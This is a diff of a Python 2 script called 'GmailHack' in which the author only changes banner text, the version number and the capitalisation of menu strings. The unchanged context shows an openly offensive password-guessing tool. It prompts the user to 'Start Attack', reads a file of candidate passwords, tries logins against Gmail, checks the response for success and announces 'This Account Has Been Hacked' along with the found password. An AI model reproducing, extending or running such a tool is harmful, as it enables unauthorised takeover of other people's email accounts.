@@ -6,20 +6,20 @@ from os import system
 
 def main():
    print '==================================================='
-   print '               create by Hak9                 '
+   print '                 create by Hak9                    '
    print '==================================================='
    print '               ++++++++++++++++++++                '
    print '\n                                                 '
-   print '                    GmailHack                      '
-   print '                                 ()   V.1.0        '
+   print '                   GmailHack                       '
+   print '                                 ()   V.1.2        '
    print '                                                   '
    
 main()
-print '[1] start the attack'
-print '[2] exit'
+print '[01] Start Attack'
+print '[02] Exit'
 option = input('==>')
 if option == 1:
-   file_path = raw_input('path of passwords file :')
+   file_path = raw_input('Path of Password File :')
 else:
    system('clear')
    exit()
@@ -45,7 +45,7 @@ def login():
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+            print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
 
             break
          else:
